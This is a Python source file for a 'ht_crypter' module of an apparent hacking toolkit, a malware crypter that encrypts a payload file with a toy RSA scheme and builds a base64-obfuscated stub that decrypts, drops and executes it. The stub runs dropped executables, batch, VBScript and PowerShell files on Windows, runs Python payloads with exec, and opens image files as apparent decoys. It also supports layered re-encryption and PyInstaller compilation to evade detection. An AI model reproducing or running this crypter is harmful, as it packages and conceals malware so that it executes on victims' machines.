from hackingtools.core import Logger, Config
import hackingtools as ht 

import binascii
import sys
from argparse import ArgumentParser
import os.path
import math
from random import randint
import base64
import binascii
import random
import shutil
config = Config.getConfig(parentKey='modules', key='ht_crypter')

class StartModule():

	def __init__(self):
		Logger.printMessage(message='ht_crypter loaded', debug_core=True)
		pass

	def help(self):
		Logger.printMessage(message=ht.getFunctionsNamesFromModule('ht_crypter'))

	def getMalwareData(self, fileName):
		"""
		Get's binary from the file given in param as fileName
		Param fileName: path to the file
		Return: byte array
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
		file = open(fileName, "rb")
		file_data = file.read()
		file.close()
		return file_data

	def convertToExe(self, stub_name):
		"""
		Convert's given Python file into a new one with the same name and .exe as extension
		Compile's with pyinstaller and could be change it's params in config.json
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
		# Convert py to exe with pyinstaller
		import os
		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
		filename = '{file}.exe'.format(file=stub_name.split('.')[0].split('\\')[-1])

		file_to_move = os.path.abspath(os.path.join('dist', '{file}'.format(file=filename)))
		new_file = os.path.abspath(os.path.join(os.path.dirname(stub_name), filename))

		if os.path.isfile(file_to_move) and not os.path.isfile(new_file):
			os.rename(file_to_move, new_file)

		new_spec_file = '{name}.spec'.format(name=new_file.split('.')[0])
		if os.path.isfile(new_spec_file):
			os.remove(new_spec_file)

		build_dir = os.path.abspath(os.path.join('build', '{file}'.format(file=filename.split('.')[0])))
		if os.path.isdir(build_dir):
			shutil.rmtree(build_dir)

		if os.path.isfile(file_to_move):
			os.remove(file_to_move)

		spec_file = os.path.abspath('{file}.spec'.format(file=filename.split('.')[0]))
		if os.path.isfile(spec_file):
			os.remove(spec_file)

	def is_valid_file(self, parser, arg):
		"""
		Returns the file if exists, else, print's and error
		"""
		if not os.path.exists(arg):
			parser.error("The file {file} does not exist!".format(file=arg))
		else:
			return arg

	def clean_output_dir(self):
		"""
		Clean's the output.
		Is used for removing all bad files we don't want in our path if we want to upload after to Pypi
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
		if os.path.isdir(output_dir):
			shutil.rmtree(output_dir)

	def saveStub(self, stub, save_name, print_save_stub=True):
		"""
		Saves a new file with a Byte Array and a filename
		Param stub: Byte Array
		Param save_name: String
		Param print_save_stub: True/False
		This is used for saving the crypted file when crypt_file() is called
		"""
		stub_name = save_name
		stub_file = open(stub_name, "w")
		stub_file.write(stub)
		stub_file.close()
		if print_save_stub:
			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)

	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
		"""
		Create's the stub for the crypter and has some courious params he have to see:
		Param crypto_data_hex: Byte Array
		Param public_key: (x, y)
		Param drop_file_name: String
		Param save_name: String
		Param print_save_stub: True/False
		Param is_iterating: True/False
		Param is_last: True/False
		Param convert: True/False
		"""
		stub = ''
		if is_last:
			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "drpnm = \"" + drop_file_name + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += """
def dcy(pk, cptx):
	k, n = pk
	mensajeRecibido = __reBa64__(cptx.encode('utf-8'))
	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)
	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]
	mensaje_de_ascii = __deAS__(mensajeDescifrado)
	decasc = __reBa64__(''.join(mensaje_de_ascii).encode())
	hexba64 = __ba64Hex__(decasc)
	ashex = __hexDec__(hexba64)
	deasc = __deAS__(ashex)
	ba64 = base64.b64decode(deasc.encode())
	return ba64
def __reBa64__(m):
	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]
	return mBa64
def __ba64Hex__(m):
	mHx = [base64.b64decode(b64) for b64 in m]
	return mHx
def __hexDec__(m):
	mDec = [int(hexa.decode("UTF-8"), 16) for hexa in m]
	return mDec
def __deAS__(m):
	m1 = ''.join([chr(d) for d in m])
	return m1
def __meAS__(m):
	men = [ord(p) for p in m]
	return men
dcy_data = dcy(pk=pk, cptx=cdx)
"""
		if is_iterating:
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\n"
			stub += "exec(dcy_data)"
		else:
			stub += """
image_extensions = ('jpg', 'jpeg', 'bpm', 'ico', 'png')
exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
python_extensions = ('py')
nf = open(drpnm, 'wb')
try:
	nf.write(dcy_data)
except:
	pass
nf.close()
if os.path.exists(drpnm):
	if drpnm.split('.')[1] in image_extensions:
		imageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
	if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
		os.system(drpnm)
	if drpnm.split('.')[1] in python_extensions:
		exec(dcy_data)
		proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""

		stub_base64 = base64.b64encode(stub.encode('utf-8'))
		stub = "import base64\n"
		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
		stub += "exec(base64.b64decode(data))"
		
		self.saveStub(stub, save_name, print_save_stub)

		if convert:
			self.convertToExe(save_name)

	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, print_save_stub=True, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
		"""
		Crypt's a file when some params we have to use:
		Param filename: is the path to the file you want to crypt.
		Param new_file_name: is the final name to our crypted file.
		Param drop_file_name: is the name could be used to drop a file finaly when executing crypted file. Same name could be same as new_file_name for not dropping a file.
		Param prime_length: is for generating some RSA keys with those length of prime numbers automatically generated.
		Param compile_exe: is for telling the crypter to compile it to exe if posible.
		Param print_save_stub: is for get a message at log when the crypt is finished.
		Param is_iterating: is used internally for knowing where the bucle is.
		Param iterate_count: is used internally for knowing where the bucle is.
		Param is_last: is used internally for knowing where the bucle is.
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
		temp_filename = filename
		if iterate_count > 1:
			temp_filename = filename
			for i in range(1, iterate_count):
				if i == iterate_count - 1:
					is_last = True
				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, print_save_stub=False, compile_exe=False, is_iterating=True, iterate_count=1, is_last=is_last)
		
		filename = temp_filename
		if filename and new_file_name:
			crypter_rsa = ht.getModule('ht_rsa')
			data = self.getMalwareData(filename)
			prime_a, prime_b = crypter_rsa.getRandomKeypair(prime_length)
			public, private = crypter_rsa.generate_keypair(prime_a, prime_b)
			crypted_data = crypter_rsa.encrypt(private_key=private, plaintext=data)
			new_file = new_file_name
			if not '.' in new_file:
				new_file = '{file}.py'.format(file=new_file)

			if compile_exe:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last, convert=True)
				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
			else:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last)
			return new_file
		else:
			return None